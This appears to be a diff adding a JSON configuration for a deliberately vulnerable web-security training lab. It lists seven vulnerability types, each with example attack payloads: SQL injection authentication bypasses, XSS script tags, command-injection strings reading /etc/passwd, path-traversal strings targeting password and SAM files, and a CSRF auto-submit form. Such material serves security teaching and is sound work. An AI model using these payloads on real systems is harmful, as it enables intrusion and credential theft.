@@ -1,0 +1,274 @@
+{
+  "success": true,
+  "count": 7,
+  "vulnerabilities": [
+    {
+      "id": "sql_injection",
+      "name": "SQL Injection",
+      "icon": "\ud83d\udc89",
+      "category": "web",
+      "description": "Manipulate database queries to extract data or bypass authentication",
+      "difficulty_range": "easy-hard",
+      "exploit_interface": {
+        "type": "sql_injection",
+        "title": "SQL Injection Exploit Lab",
+        "input_fields": [
+          {
+            "name": "username",
+            "label": "Username",
+            "type": "text",
+            "placeholder": "admin' OR '1'='1' --"
+          },
+          {
+            "name": "password",
+            "label": "Password",
+            "type": "password",
+            "placeholder": "anything"
+          }
+        ],
+        "payload_examples": [
+          {
+            "name": "Auth Bypass",
+            "payload": "admin' --",
+            "difficulty": "easy"
+          },
+          {
+            "name": "Boolean Logic",
+            "payload": "admin' OR '1'='1' --",
+            "difficulty": "easy"
+          },
+          {
+            "name": "UNION Attack",
+            "payload": "admin' UNION SELECT NULL--",
+            "difficulty": "medium"
+          },
+          {
+            "name": "Time-Based Blind",
+            "payload": "admin' AND SLEEP(5)--",
+            "difficulty": "hard"
+          },
+          {
+            "name": "Advanced Bypass",
+            "payload": "admin'/**/OR/**/'1'='1'/**/--",
+            "difficulty": "expert"
+          }
+        ],
+        "endpoint": "/api/v1/vulnerabilities/sql-injection/login",
+        "method": "POST"
+      }
+    },
+    {
+      "id": "xss",
+      "name": "Cross-Site Scripting (XSS)",
+      "icon": "\ud83d\udcdc",
+      "category": "web",
+      "description": "Inject malicious scripts into web pages viewed by other users",
+      "difficulty_range": "easy-hard",
+      "exploit_interface": {
+        "type": "xss",
+        "title": "XSS Exploit Playground",
+        "input_fields": [
+          {
+            "name": "payload",
+            "label": "XSS Payload",
+            "type": "textarea",
+            "placeholder": "<script>alert('XSS')</script>"
+          }
+        ],
+        "payload_examples": [
+          {
+            "name": "Basic Alert",
+            "payload": "<script>alert(1)</script>",
+            "difficulty": "easy"
+          },
+          {
+            "name": "Image Tag",
+            "payload": "<img src=x onerror=alert(1)>",
+            "difficulty": "easy"
+          },
+          {
+            "name": "SVG",
+            "payload": "<svg onload=alert(1)>",
+            "difficulty": "medium"
+          },
+          {
+            "name": "Encoded",
+            "payload": "&#60;script&#62;alert(1)&#60;/script&#62;",
+            "difficulty": "hard"
+          }
+        ],
+        "endpoint": "/api/v1/vulnerabilities/xss",
+        "method": "GET"
+      }
+    },
+    {
+      "id": "command_injection",
+      "name": "Command Injection",
+      "icon": "\ud83d\udcbb",
+      "category": "web",
+      "description": "Execute arbitrary system commands on the server",
+      "difficulty_range": "medium-hard",
+      "exploit_interface": {
+        "type": "command_injection",
+        "title": "Command Injection Terminal",
+        "input_fields": [
+          {
+            "name": "command",
+            "label": "Command Input",
+            "type": "text",
+            "placeholder": "127.0.0.1; cat /etc/passwd"
+          }
+        ],
+        "payload_examples": [
+          {
+            "name": "Semicolon",
+            "payload": "127.0.0.1; whoami",
+            "difficulty": "easy"
+          },
+          {
+            "name": "AND Logic",
+            "payload": "127.0.0.1 && cat /etc/passwd",
+            "difficulty": "medium"
+          },
+          {
+            "name": "Pipe",
+            "payload": "127.0.0.1 | ls -la",
+            "difficulty": "medium"
+          },
+          {
+            "name": "Backticks",
+            "payload": "`cat /etc/passwd`",
+            "difficulty": "hard"
+          }
+        ],
+        "endpoint": "/api/v1/vulnerabilities/command-injection/ping",
+        "method": "POST"
+      }
+    },
+    {
+      "id": "path_traversal",
+      "name": "Path Traversal",
+      "icon": "\ud83d\udcc2",
+      "category": "web",
+      "description": "Access files outside the intended directory structure",
+      "difficulty_range": "easy-medium",
+      "exploit_interface": {
+        "type": "path_traversal",
+        "title": "Path Traversal File Browser",
+        "input_fields": [
+          {
+            "name": "filepath",
+            "label": "File Path",
+            "type": "text",
+            "placeholder": "../../../etc/passwd"
+          }
+        ],
+        "payload_examples": [
+          {
+            "name": "Basic",
+            "payload": "../../../etc/passwd",
+            "difficulty": "easy"
+          },
+          {
+            "name": "Windows",
+            "payload": "..\\..\\..\\windows\\system32\\config\\sam",
+            "difficulty": "easy"
+          },
+          {
+            "name": "Encoded",
+            "payload": "..%2F..%2F..%2Fetc%2Fpasswd",
+            "difficulty": "medium"
+          },
+          {
+            "name": "Null Byte",
+            "payload": "../../../etc/passwd%00",
+            "difficulty": "hard"
+          }
+        ],
+        "endpoint": "/api/v1/vulnerabilities/directory-traversal/read",
+        "method": "GET"
+      }
+    },
+    {
+      "id": "csrf_attack",
+      "name": "Cross-Site Request Forgery",
+      "icon": "\ud83d\udd17",
+      "category": "web",
+      "description": "Force users to execute unwanted actions",
+      "difficulty_range": "medium",
+      "exploit_interface": {
+        "type": "csrf",
+        "title": "CSRF Exploit Lab",
+        "input_fields": [
+          {
+            "name": "target_url",
+            "label": "Target URL",
+            "type": "text",
+            "placeholder": "https://victim.com/transfer"
+          },
+          {
+            "name": "payload",
+            "label": "CSRF Payload",
+            "type": "textarea",
+            "placeholder": "<form action='...'>"
+          }
+        ],
+        "payload_examples": [
+          {
+            "name": "Form Auto-Submit",
+            "payload": "<form id='csrf' action='...' method='POST'><input name='amount' value='1000'></form><script>document.getElementById('csrf').submit()</script>",
+            "difficulty": "medium"
+          }
+        ],
+        "endpoint": "/api/v1/vulnerabilities/csrf/test",
+        "method": "POST"
+      }
+    },
+    {
+      "id": "ssrf_attack",
+      "name": "Server-Side Request Forgery",
+      "icon": "\ud83c\udf10",
+      "category": "web",
+      "description": "Make server perform requests to internal resources",
+      "difficulty_range": "easy-hard",
+      "exploit_interface": {
+        "type": "ssrf",
+        "title": "SSRF Exploit Lab",
+        "input_fields": [
+          {
+            "name": "url",
+            "label": "Target URL",
+            "type": "text",
+            "placeholder": null
+          }
+        ],
+        "payload_examples": [],
+        "endpoint": "/api/v1/vulnerabilities/ssrf/test",
+        "method": "POST"
+      }
+    },
+    {
+      "id": "idor_attack",
+      "name": "Insecure Direct Object Reference",
+      "icon": "\ud83d\udd11",
+      "category": "web",
+      "description": "Access objects by modifying identifiers",
+      "difficulty_range": "easy-hard",
+      "exploit_interface": {
+        "type": "idor",
+        "title": "IDOR Exploit Lab",
+        "input_fields": [
+          {
+            "name": "object_id",
+            "label": "Object ID",
+            "type": "number",
+            "placeholder": null
+          }
+        ],
+        "payload_examples": [],
+        "endpoint": "/api/v1/vulnerabilities/idor/test",
+        "method": "GET"
+      }
+    }
+  ]
+}
